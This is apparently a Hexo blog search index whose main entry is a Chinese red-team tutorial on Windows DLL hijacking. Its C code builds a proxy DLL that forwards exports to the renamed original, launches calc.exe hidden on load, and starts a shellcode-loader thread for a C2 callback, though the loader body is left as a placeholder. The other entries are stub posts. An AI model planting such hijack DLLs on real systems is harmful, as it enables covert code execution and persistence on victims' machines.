<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DLL hijacking from hijacking to on-line</title>
      <link href="2021/07/19/dll-hijacking-from-hijacking-to-on-line/"/>
      <url>2021/07/19/dll-hijacking-from-hijacking-to-on-line/</url>
      
        <content type="html"><![CDATA[<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><pre class="line-numbers language-none"><code class="language-none">DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL程序所在目录加载 DLL 时所在的当前目录系统目录即SYSTEM32目录16位系统目录即SYSTEM目录Windows目录PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基本案例"><a href="#基本案例" class="headerlink" title="基本案例"></a>基本案例</h2><pre class="line-numbers language-none"><code class="language-none">此处需要非常多的一些基础语法知识，此处不进行深入赘述此处利用转发来实现程序A调用aaa.dll中的函数，现将aaa.dll修改为aaa_o.dll，再重新写个aaa.dll将原本的函数转发到aaa_o.dlldll如下，需要再写个exe去调用这个dll和他的函数aaa.dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); &#125;调用成功效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![1](/img/DLL hijacking from hijacking to on-line/1.png)</p><pre class="line-numbers language-none"><code class="language-none">再看下导出函数，确认test导出函数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![2](/img/DLL hijacking from hijacking to on-line/2.png)</p><pre class="line-numbers language-none"><code class="language-none">新的dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:WinExec(&quot;calc.exe&quot;, SW_HIDE); case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);if (hDllInst) &#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc) &#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;劫持后效果如下与这里不同的方式可使用预编译，更加快捷#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![3](/img/DLL hijacking from hijacking to on-line/3.png)</p><pre class="line-numbers language-none"><code class="language-none">上线利用：extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DoSC(LPVOID lpParameter)&#123;这里其实和写加载器一样&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;最终效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![4](/img/DLL hijacking from hijacking to on-line/4.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近太忙了，等过两天有空了开始更新！</title>
      <link href="2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/"/>
      <url>2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="博客暂未完全调试好，敬请期待"><a href="#博客暂未完全调试好，敬请期待" class="headerlink" title="博客暂未完全调试好，敬请期待"></a>博客暂未完全调试好，敬请期待</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>this is my test blog</title>
      <link href="2021/03/21/this-is-my-test-blog/"/>
      <url>2021/03/21/this-is-my-test-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/03/21/hello-world/"/>
      <url>2021/03/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
